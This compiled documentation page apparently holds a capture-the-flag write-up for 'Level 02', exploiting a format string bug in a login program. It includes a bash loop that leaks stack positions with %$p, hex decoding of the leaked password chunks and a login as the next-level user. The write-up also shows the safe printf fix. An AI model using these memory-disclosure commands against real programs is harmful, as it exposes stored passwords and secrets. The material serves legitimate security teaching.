"use strict";(self.webpackChunkdocumentation=self.webpackChunkdocumentation||[]).push([[528],{3905:(e,s,n)=>{n.d(s,{A:()=>a});var t=n(6540),i=n(4848);const a=({src:e,id:s})=>{const n=(0,t.useRef)(null);return(0,t.useEffect)(()=>{const t=document.createElement("script");return t.src=e,t.id=s,t.async=!0,n.current&&n.current.appendChild(t),()=>{const e=document.getElementById(s);e&&e.remove()}},[e,s]),(0,i.jsx)("div",{ref:n})}},4661:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>h,contentTitle:()=>u,default:()=>v,frontMatter:()=>m,metadata:()=>t,toc:()=>p});const t=JSON.parse('{"id":"level02","title":"\ud83d\udca3 Level 02","description":"<MissionObjective","source":"@site/docs/level02.md","sourceDirName":".","slug":"/level02","permalink":"/docs/level02","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/level02.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"sidebar_position":4},"sidebar":"tutorialSidebar","previous":{"title":"\ud83d\udd10 Level 01","permalink":"/docs/level01"},"next":{"title":"\ud83d\udd10 Level 03","permalink":"/docs/level03"}}');var i=n(4848),a=n(8453),r=n(3905),o=n(7916),c=n(8620),l=n(4700),d=n(6076);const m={sidebar_position:4},u="\ud83d\udca3 Level 02",h={},p=[{value:"Vulnerability Analysis",id:"vulnerability-analysis",level:2},{value:"Initial Program Analysis",id:"initial-program-analysis",level:2},{value:"Debugging Challenges",id:"debugging-challenges",level:2},{value:"Static Analysis Findings",id:"static-analysis-findings",level:2},{value:"Format String Vulnerability Discovery",id:"format-string-vulnerability-discovery",level:2},{value:"Live Demonstration",id:"live-demonstration",level:2},{value:"Password Extraction Process",id:"password-extraction-process",level:2},{value:"Technical Breakdown",id:"technical-breakdown",level:2},{value:"Format String Exploitation Summary",id:"format-string-exploitation-summary",level:2},{value:"Key Takeaways",id:"key-takeaways",level:2}];function x(e){const s={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.header,{children:(0,i.jsx)(s.h1,{id:"-level-02",children:"\ud83d\udca3 Level 02"})}),"\n",(0,i.jsx)(o.A,{level:"Level 02",target:"Password extraction",method:"Format string vulnerability exploitation"}),"\n",(0,i.jsx)(s.h2,{id:"vulnerability-analysis",children:"Vulnerability Analysis"}),"\n",(0,i.jsx)(c.A,{type:"Format String Vulnerability",severity:"high",description:"The program uses printf(buffer) instead of printf('%s', buffer), allowing attackers to read arbitrary memory locations through format specifiers like %p, %x, and %s.",techniques:["Memory Disclosure","Stack Dumping","Format String Exploitation"]}),"\n",(0,i.jsx)(s.h2,{id:"initial-program-analysis",children:"Initial Program Analysis"}),"\n",(0,i.jsx)(l.A,{title:"Program Execution",command:"./level02",output:"===== [ Secure Access System v1.0 ] =====\n/***************************************\\\n| You must login to access this system. |\n\\**************************************/\n--[ Username: test\n--[ Password: test\ntest does not have access!"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.strong,{children:"Key Observations:"})}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"Program prompts for username and password"}),"\n",(0,i.jsx)(s.li,{children:'Rejects all login attempts with "does not have access!" message'}),"\n",(0,i.jsx)(s.li,{children:"Uses a secure access system interface"}),"\n"]}),"\n",(0,i.jsx)(s.h2,{id:"debugging-challenges",children:"Debugging Challenges"}),"\n",(0,i.jsx)(l.A,{title:"GDB Analysis Attempt",command:"gdb ./level02",output:"(gdb) run\nERROR: failed to open password file"}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.strong,{children:"Critical Discovery:"})," The binary detects debugger environment and refuses to open the password file, making direct memory inspection impossible."]}),"\n",(0,i.jsx)(s.h2,{id:"static-analysis-findings",children:"Static Analysis Findings"}),"\n",(0,i.jsx)(l.A,{title:"Disassembly Analysis",command:"(gdb) disas main",output:"Key findings from disassembly:\n- fopen() reads password from file\n- fread() loads password into stack buffer  \n- printf(buffer) - VULNERABLE FORMAT STRING\n- strncmp() compares user input to password"}),"\n",(0,i.jsx)(s.h2,{id:"format-string-vulnerability-discovery",children:"Format String Vulnerability Discovery"}),"\n",(0,i.jsx)(l.A,{title:"Testing Format String",command:'echo "%x %x %x %x" | ./level02',output:"===== [ Secure Access System v1.0 ] =====\n/***************************************\\\n| You must login to access this system. |\n\\**************************************/\n--[ Username: %x %x %x %x\n--[ Password: \n7fffffffe4d0 f7ff0000 0 7fffffffe5d8 does not have access!"}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.strong,{children:"Vulnerability Confirmed:"})," The program outputs raw hex values from memory!"]}),"\n",(0,i.jsx)(s.h2,{id:"live-demonstration",children:"Live Demonstration"}),"\n",(0,i.jsx)(r.A,{src:"https://asciinema.org/a/bZKQrcaB5tGzuhHWxjO0E30KK.js",id:"asciicast-bZKQrcaB5tGzuhHWxjO0E30KK"}),"\n",(0,i.jsx)(s.h2,{id:"password-extraction-process",children:"Password Extraction Process"}),"\n",(0,i.jsx)(d.A,{steps:[{title:"Stack Position Enumeration",description:"Use format string to leak different stack positions systematically",command:'for i in {1..50}; do echo "$i - %$i\\$p" | ./level02 | grep does; done',output:"Scanning stack positions 1-50 for password data..."},{title:"Identify Password Locations",description:"Find hex values that look like ASCII password chunks",command:"Key findings at specific positions:",output:"22 - 0x756e505234376848 does not have access!\n23 - 0x45414a3561733951 does not have access!\n24 - 0x377a7143574e6758 does not have access!\n25 - 0x354a35686e475873 does not have access!\n26 - 0x48336750664b394d does not have access!"},{title:"Convert Little-Endian Hex to ASCII",description:"Decode each hex value accounting for little-endian byte order",command:"Hex to ASCII conversion process:",output:"echo 756e505234376848 | sed 's/../& /g' | tac -rs ' ' | tr -d '\\n ' | xxd -r -p\n# Result: HhH7R4Pnu\n\nRepeat for each hex value to get password chunks"},{title:"Reconstruct Complete Password",description:"Combine all decoded chunks in correct order",command:"Final password assembly",output:"Complete password: [decoded_password_string]"},{title:"Successful Authentication",description:"Use extracted password to gain access",command:"./level02",output:"===== [ Secure Access System v1.0 ] =====\n--[ Username: level03\n--[ Password: [extracted_password]\nGreetings, level03!\n$ whoami\nlevel03"}]}),"\n",(0,i.jsx)(s.h2,{id:"technical-breakdown",children:"Technical Breakdown"}),"\n",(0,i.jsx)(l.A,{title:"Hex Decoding Process",command:"# Step-by-step hex to ASCII conversion",output:"1. Split hex into byte pairs: 75 6e 50 52 34 37 68 48\n2. Reverse byte order (little-endian): 48 68 37 34 52 50 6e 75  \n3. Convert to ASCII: HhH7R4Pnu\n4. Repeat for all password chunks\n5. Concatenate results in stack order"}),"\n",(0,i.jsx)(s.h2,{id:"format-string-exploitation-summary",children:"Format String Exploitation Summary"}),"\n",(0,i.jsx)(l.A,{title:"Exploitation Methodology",command:"# Format string vulnerability breakdown",output:'Vulnerable code: printf(buffer);\nSafe code:       printf("%s", buffer);\n\nExploitation technique:\n- %p: Print pointer values from stack\n- %n$p: Print nth argument from stack  \n- Stack contains password loaded by fread()\n- Memory layout reveals password in chunks'}),"\n",(0,i.jsx)(s.h2,{id:"key-takeaways",children:"Key Takeaways"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Format string vulnerabilities"})," allow reading arbitrary memory through printf format specifiers"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Anti-debugging techniques"})," can prevent dynamic analysis, requiring creative approaches"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Little-endian encoding"})," must be considered when extracting multi-byte values"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Stack layout understanding"})," is crucial for systematic memory disclosure"]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Automated scanning"})," with loops can efficiently map memory contents"]}),"\n"]}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.strong,{children:"Tools used:"})," ",(0,i.jsx)(s.code,{children:"printf format strings"}),", ",(0,i.jsx)(s.code,{children:"bash loops"}),", ",(0,i.jsx)(s.code,{children:"sed"}),", ",(0,i.jsx)(s.code,{children:"xxd"}),", ",(0,i.jsx)(s.code,{children:"tac"}),", static analysis"]}),"\n",(0,i.jsx)(s.admonition,{title:"Anti-Debugging Protection",type:"warning",children:(0,i.jsx)(s.p,{children:"This binary demonstrates how programs can detect debugging environments and alter behavior. Always consider both dynamic and static analysis approaches."})}),"\n",(0,i.jsx)(s.admonition,{title:"Format String Exploitation",type:"tip",children:(0,i.jsx)(s.p,{children:"The key insight is that printf(user_input) treats the input as a format string, allowing %p and %x specifiers to read memory. Position-specific format like %22$p targets exact stack locations."})})]})}function v(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(x,{...e})}):x(e)}},4700:(e,s,n)=>{n.d(s,{A:()=>p});var t=n(6540);const i="codeContainer_ZrQf",a="codeHeader_PMJ9",r="codeTitle_tp4q",o="copyButton_vymH",c="codeContent_hjih",l="commandSection_kIAe",d="prompt_g6zt",m="command_jQGV",u="output_eCt5";var h=n(4848);const p=({command:e,output:s,language:n="bash",title:p})=>{const[x,v]=(0,t.useState)(!1);return(0,h.jsxs)("div",{className:i,children:[p&&(0,h.jsxs)("div",{className:a,children:[(0,h.jsx)("span",{className:r,children:p}),(0,h.jsx)("button",{className:o,onClick:()=>{const n=e||s||"";navigator.clipboard.writeText(n),v(!0),setTimeout(()=>v(!1),2e3)},children:x?"\u2713":"Copy"})]}),(0,h.jsxs)("div",{className:c,children:[e&&(0,h.jsxs)("div",{className:l,children:[(0,h.jsx)("span",{className:d,children:"$"}),(0,h.jsx)("span",{className:m,children:e})]}),s&&(0,h.jsx)("pre",{className:u,children:s})]})]})}},6076:(e,s,n)=>{n.d(s,{A:()=>x});n(6540);const t="stepsContainer_pG2T",i="step_fonX",a="stepHeader_lANh",r="stepNumber_JMan",o="stepTitle_pSoA",c="stepDescription_I1sy",l="codeBlock_MNNe",d="commandLine_KPva",m="prompt_hyWW",u="command_dhjP",h="output_FTQu";var p=n(4848);const x=({steps:e})=>(0,p.jsx)("div",{className:t,children:e.map((e,s)=>(0,p.jsxs)("div",{className:i,children:[(0,p.jsxs)("div",{className:a,children:[(0,p.jsx)("span",{className:r,children:s+1}),(0,p.jsx)("h3",{className:o,children:e.title})]}),(0,p.jsx)("p",{className:c,children:e.description}),e.command&&(0,p.jsxs)("div",{className:l,children:[(0,p.jsxs)("div",{className:d,children:[(0,p.jsx)("span",{className:m,children:"$"}),(0,p.jsx)("code",{className:u,children:e.command})]}),e.output&&(0,p.jsx)("pre",{className:h,children:e.output})]})]},s))})},7916:(e,s,n)=>{n.d(s,{A:()=>m});n(6540);const t="missionCard_aJIf",i="missionHeader_ujCY",a="levelBadge_E6Y7",r="missionTitle_MLqA",o="missionContent_AuQf",c="missionText_YjWt",l="targetCode_IWAs";var d=n(4848);const m=({target:e,method:s,level:n})=>(0,d.jsxs)("div",{className:t,children:[(0,d.jsxs)("div",{className:i,children:[(0,d.jsx)("span",{className:a,children:n}),(0,d.jsx)("h2",{className:r,children:"Mission Objective"})]}),(0,d.jsx)("div",{className:o,children:(0,d.jsxs)("p",{className:c,children:["Gain access to user ",(0,d.jsx)("code",{className:l,children:e})," by exploiting ",s,"."]})})]})},8453:(e,s,n)=>{n.d(s,{R:()=>r,x:()=>o});var t=n(6540);const i={},a=t.createContext(i);function r(e){const s=t.useContext(a);return t.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function o(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(a.Provider,{value:s},e.children)}},8620:(e,s,n)=>{n.d(s,{A:()=>h});n(6540);const t="card_anxl",i="header_h_Kv",a="title_xshN",r="severityBadge_p8m1",o="description_LGUH",c="techniques_SXJm",l="techniquesTitle_X_0j",d="techniquesList_aLL1",m="techniqueTag_HgBs";var u=n(4848);const h=({type:e,severity:s,description:n,techniques:h})=>{const p=e=>{switch(e){case"low":return"#22c55e";case"medium":return"#f59e0b";case"high":return"#f97316";case"critical":return"#ef4444";default:return"#6b7280"}};return(0,u.jsxs)("div",{className:t,children:[(0,u.jsxs)("div",{className:i,children:[(0,u.jsx)("h3",{className:a,children:e}),(0,u.jsx)("span",{className:r,style:{backgroundColor:`${p(s)}20`,color:p(s),borderColor:`${p(s)}40`},children:s.toUpperCase()})]}),(0,u.jsx)("p",{className:o,children:n}),(0,u.jsxs)("div",{className:c,children:[(0,u.jsx)("h4",{className:l,children:"Techniques"}),(0,u.jsx)("div",{className:d,children:h.map((e,s)=>(0,u.jsx)("span",{className:m,children:e},s))})]})]})}}}]);